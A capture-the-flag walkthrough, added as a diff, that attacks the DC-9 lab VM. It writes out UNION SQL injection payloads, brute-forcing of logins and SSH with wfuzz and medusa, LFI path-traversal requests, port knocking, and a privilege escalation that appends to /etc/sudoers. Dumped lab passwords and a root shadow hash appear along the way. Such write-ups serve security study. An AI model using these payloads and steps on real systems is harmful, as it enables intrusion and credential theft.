@@ -1,0 +1,452 @@
+SQL Injection reference: https://pentestmonkey.net/category/cheat-sheet/sql-injection 
+
+1. nmap scan of the box: 
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Example.com - Staff Details - Welcome
+
+only seeing 80 is open
+
+2. checking out the example site. 
+- Standard example site, and search seems to be the most interesting page. 
+  search takes first name or last name and returns a result 
+
+3. run a gobuster against the site. 
+gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobuster-main.out
+
+dir == setting gobuster to use directory mode 
+-x == add extension (php in this example because the site is showing it)
+-o == output results to a file 
+
+Results in gobuster-main.out
+
+4. Testing SQL Injection requests to search in burp with intercept on. 
+- No SQL error with simple test of <FIRSTNAME> and a ' at the end 
+- Data is returned when a comment is added " <FIRSTNAME>'-- - "
+- SQL injection is possible 
+- reference of what gets returned names: 
+        ID: 1
+        Name: Mary Moe
+        Position: CEO
+        Phone No: 46478415155456
+        Email: marym@example.com
+- SQL UNION Injection PoC: 
+-- In order for a UNION to work I need to know what should be included in the select. 
+Using the above return as a reference testing UNION in burp: 
+
+POST /results.php HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+Origin: http://10.0.2.4
+Connection: close
+Referer: http://10.0.2.4/search.php
+Upgrade-Insecure-Requests: 1
+
+search=Mary' UNION SELECT 1,2,3,4,5,6-- -
+
+The above request returns the following it its response once 6 args are passed: 
+                ID: 1<br/>Name: 2 3<br/>
+                Position: 4<br />
+                Phone No: 5<br />
+                Email: 6<br/><br/>Another test can be done by passing database()First and Last
+
+NOTE: you can also use ORDER BY to tests results in a response. Pass the following Query until the response is different (byte size)
+Example: 
+
+POST /results.php HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Origin: http://10.0.2.4
+Connection: close
+Referer: http://10.0.2.4/search.php
+Upgrade-Insecure-Requests: 1
+
+search=Mary' ORDER BY 7 -- -
+
+On the 7th request the bytes are differnt than the previous 6 requests. This tells me that SQL was not able to find a match. 
+
+Gathering more information about the schema with: 
+search=Mary' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM information_schema.schemata-- -
+
+Returns: 
+ID: 1                  
+ID: information_schema << 
+ID: Staff
+ID: users
+
+All of the above information can be returned on a single line with: 
+search=Mary' UNION SELECT group_concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata-- -
+
+Result: 
+ID: information_schema,Staff,users
+
+5. Gathering information about Staff and Users
+- This request gives me all the table names 
+search=Mary' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables-- -
+
+Refining this to the Staff instance with 
+search=Mary' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables where table_schema = "Staff"-- -
+
+- Staff has the following tables: 
+  StaffDetailss
+  Users
+ 
+Using this to get columns
+search=Mary' UNION SELECT group_concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = "Staff"-- -
+
+- Staff has the following columns: 
+  id,
+  firstname,
+  lastname,
+  position,
+  phone, 
+  email,
+  reg_date,
+  UserID,
+  Username,
+  Password
+
+Using this to get the relationships within Staff 
+search=Mary' UNION SELECT group_concat(TABLE_NAME,":",COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = "Staff"-- -
+
+saved in db_details
+
+6. Extract Users Passwords from instances
+search=Mary' UNION SELECT group_concat(Username,":",PAssword),2,3,4,5,6 FROM Staff.Users-- -
+
+and
+
+search=Mary' UNION SELECT group_concat(username,":",password),2,3,4,5,6 FROM users.UserDetails-- -
+
+All usernames and passwords are strored in users
+
+7. The admin password is an md5 hash
+856f5de590ef37314e7c3bdf6f8a66dc:transorbital1
+
+8. Testing logins. 
+NOTE there is no CSRF token present on login. 
+
+POST /manage.php HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Origin: http://10.0.2.4
+Connection: close
+Referer: http://10.0.2.4/manage.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+username=testusername&password=testpassword
+
+Seperate out usernames and passwords with awk: 
+┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
+└─$ awk -F: '{print $1}' users > usernames
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
+└─$ awk -F: '{print $2}' users > passwords
+
+Using WFUZZ to test login
+
+┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
+└─$ wfuzz -c -z file,usernames -z file,passwords -m zip -d 'username=FUZZ&password=FUZ2Z' http://10.0.2.4/manage.php
+
+-c == output with color 
+-z == Payload
+-m == iterate for combining payloads
+-d == POST data
+
+Target: http://10.0.2.4/manage.php
+Total requests: 18
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                   
+=====================================================================
+
+000000016:   200        50 L     93 W       1248 Ch     "scoots - YR3BVxxxw87"                                                                    
+302 [redirect response tells me this worked]>>>>>> 000000001:   302        50 L     87 W       1210 Ch     "admin - transorbital1"                                                                   
+000000002:   200        50 L     93 W       1248 Ch     "marym - 3kfs86sfd"                                                                       
+000000005:   200        50 L     93 W       1248 Ch     "barneyr - RocksOff"                                                                      
+000000008:   200        50 L     93 W       1248 Ch     "wilmaf - Pebbles"                                                                        
+000000014:   200        50 L     93 W       1248 Ch     "monicag - 3248dsds7s"                                                                    
+000000015:   200        50 L     93 W       1248 Ch     "phoebeb - smellycats"                                                                    
+000000003:   200        50 L     93 W       1248 Ch     "julied - 468sfdfsd2"                                                                     
+000000007:   200        50 L     93 W       1248 Ch     "jerrym - B8m#48sd"                                                                       
+000000009:   200        50 L     93 W       1248 Ch     "bettyr - BamBam01"                                                                       
+000000006:   200        50 L     93 W       1248 Ch     "tomc - TC&TheBoyz"                                                                       
+000000004:   200        50 L     93 W       1248 Ch     "fredf - 4sfd87sfd1"                                                                      
+000000017:   200        50 L     93 W       1248 Ch     "janitor - Ilovepeepee"                                                                   
+000000018:   200        50 L     93 W       1248 Ch     "janitor2 - Hawaii-Five-0"                                                                
+000000013:   200        50 L     93 W       1248 Ch     "rossg - ILoveRachel"                                                                     
+000000011:   200        50 L     93 W       1248 Ch     "joeyt - Passw0rd"                                                                        
+000000012:   200        50 L     93 W       1248 Ch     "rachelg - yN72#dsd"                                                                      
+000000010:   200        50 L     93 W       1248 Ch     "chandlerb - UrAG0D!"                                                                     
+
+9. Logging in as admin and taking a look around
+
+On login there is a message stating "file does not exist" 
+- http://10.0.2.4/addrecord.php this page allows me to add a new record into the DB. 
+
+- Going to fuzz http://10.0.2.4/manage.php to see if I can sort out what file it is looking for. 
+- NOTE: wfuzz in this instance needs the PHPSESSION to be passed into it
+-- reference: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+
+- LFI test: 
+┌──(kali㉿kali)-[/usr/share]
+└─$ wfuzz -b 'PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0' --hw 100 -c -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://10.0.2.4/manage.php?FUZZ=../../../../../../../../../../../../../etc/passwd
+
+-b == cookie 
+--hw == hide word count (in this case 100 == failed result after prvious testing)
+- c == colors
+- w == wordlist (using something from SecLists)
+- ../../../../../../../../../../../../../etc/passwd (init test for LFI to see if passwd comes back)
+
+- Testing result in the burp: 
+
+GET /manage.php?file=../../../../../../../../../../../../../etc/passwd HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.0.2.4/search.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+Response in passwd
+
+10. explore LFI 
+- look for log file
+Request: 
+GET /manage.php?file=../../../../../../../../../../../../../var/log/apache2/access.log HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.0.2.4/search.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+Response: File does not exist
+
+- test for code execution
+- searching through the /proc/self directory to gain info on what PID this user is: 
+Request: 
+GET /manage.php?file=../../../../../../../../../../../../../proc/self/cmdline HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.0.2.4/search.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+Response: 
+<br />/usr/sbin/apache2-kstart	
+Going to fuzz the /proc/self/fd directory (this is where processes are listed for the above user)
+
+┌──(kali㉿kali)-[/proc/self/fd]
+└─$ wfuzz -z range,0-100 -b 'PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0' --hw 100 -u http://10.0.2.4/manage.php?file=../../../../../../../../../../../../../proc/self/fd/FUZZ
+
+- The above returns nothing. 
+
+- Look at /proc/sched_debug
+Request: 
+
+GET /manage.php?file=../../../../../../../../../../../../../proc/sched_debug HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.0.2.4/search.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+Response: sched_debug
+
+11. looking through sched_debug
+Of the items in the file this is the most interesting service 
+S         knockd   432      7559.155140        24   120         0.000000         2.756032         0.000000 0 0 /
+knockd is a port knocking serivce. 
+
+12. View knockd.conf with a request: 
+GET /manage.php?file=../../../../../../../../etc/knockd.conf HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.0.2.4/addrecord.php
+Cookie: PHPSESSID=gmhu9tsmbulo9olbueij0kejdj
+Upgrade-Insecure-Requests: 1
+
+Response: in knockd.conf
+
+Looking at the conf file I can see that if I want ssh to open up on the box I need to hit ports 7469,8475,9842 in order
+
+13. Knock on the ports with nmap
+-p- == scan all ports
+-r == do not run through ports in a random order
+
+┌──(kali㉿kali)-[~/CTF]
+└─$ nmap -p- -r 10.0.2.4
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 17:02 EDT
+Nmap scan report for 10.0.2.4
+Host is up (0.00034s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 2.94 seconds
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/CTF]
+└─$ nc 10.0.2.4 22      
+SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1 <<< SSH is now open
+
+Running hydra against ssh did not connect. 
+
+Trying with ncrack next: 
+ncrack -v -U usernames -P passwords ssh://10.0.2.4  
+-v == verbose
+-U == <filename>: username file
+-P == <filename>: password file
+
+results: in ssh_creds
+
+14. Enumerate with LinPEAS using the ssh_creds
+Move linpeas into www then run server
+┌──(kali㉿kali)-[~/…/JvP-prep/sql-inject-LFI/DC-9/www]
+└─$ python -m SimpleHTTPServer 80                                                                                                       1 ⨯
+Serving HTTP on 0.0.0.0 port 80 ...
+
+enumerate as all three users: 
+
+LinPEAS reveals that there are a bunch of backup files under /var/www/html/
+In this directory there is a config.php listing Db creds. 
+chandlerb@dc-9:/var/www/html$ cat config.php
+
+        $servername = "localhost";
+        $username = "dbuser";
+        $password = "password";
+        $dbname = "Staff";
+        $conn = mysqli_connect($servername, $username, $password, $dbname);
+
+15. looking through the Db
+chandlerb@dc-9:/var/www/html$ mysql -u dbuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 53
+Server version: 10.3.17-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+
+results in db_findings
+
+I am switching to the one that was created on 2019-12-23 03:11:39 because they were also listed in the ssh_creds
+
+16. Janator account 
+Running a find as this user results in a new set of passwords
+janitor@dc-9:~$ find .
+passwords-found-on-post-it-notes.txt
+
+passwords are in: passwords2
+
+17. Trying new passwords with medusa
+┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
+└─$ medusa -h 10.0.2.4 -U usernames -P passwords2 -t 6 -M ssh
+
+two new creds found and added to the ssh_creds file
+
+18. sudo check 
+fred can run sudo 
+fredf@dc-9:~$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: /opt/devstuff/dist/test/test
+  
+19. looking in the /test/ directory. 
+fredf@dc-9:/opt/devstuff$ ls
+build  dist  __pycache__  test.py  test.spec
+
+Running: 
+fredf@dc-9:/opt/devstuff$ /opt/devstuff/dist/test/test
+Usage: python test.py read append
+
+Example to copy the shadow file: 
+fredf@dc-9:/opt/devstuff$ touch /tmp/verf
+fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test /etc/shadow /tmp/verf
+fredf@dc-9:/opt/devstuff$ cat /tmp/verf 
+root:$6$lFbb8QQt2wX7eUeE$6NC9LUG7cFwjIPZraeiOCkMqsJ4/4pndIOaio.f2f0Lsmy2G91EyxJrEZvZYjmXRfJK/jOiKK0iTGRyUrtl2R0:18259:0:99999:7:::
+daemon:*:18259:0:99999:7:::
+bin:*:18259:0:99999:7:::
+sys:*:18259:0:99999:7:::
+sync:*:18259:0:99999:7:::
+games:*:18259:0:99999:7:::
+man:*:18259:0:99999:7:::
+lp:*:18259:0:99999:7:::
+mail:*:18259:0:99999:7:::
+news:*:18259:0:99999:7:::
+...
+...
+
+Using this file we can privesc another user by adding 
+root    ALL=(ALL:ALL) ALL 
+to another user
+joeyt    ALL=(ALL:ALL) ALL 
+
+Add Joey: 
+
+fredf@dc-9:/opt/devstuff$ vi /tmp/sudoAdder
+fredf@dc-9:/opt/devstuff$ cat /tmp/sudoAdder 
+joeyt    ALL=(ALL:ALL) ALL 
+fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test /tmp/sudoAdder /etc/sudoers
+
+Verify that joey is now in sudoers on the box
+joeyt@dc-9:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for joeyt: 
+Matching Defaults entries for joeyt on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User joeyt may run the following commands on dc-9:
+    (ALL : ALL) ALL
+joeyt@dc-9:~$ sudo su
+root@dc-9:/home/joeyt# 
+
+root@dc-9:~# ls
+theflag.txt
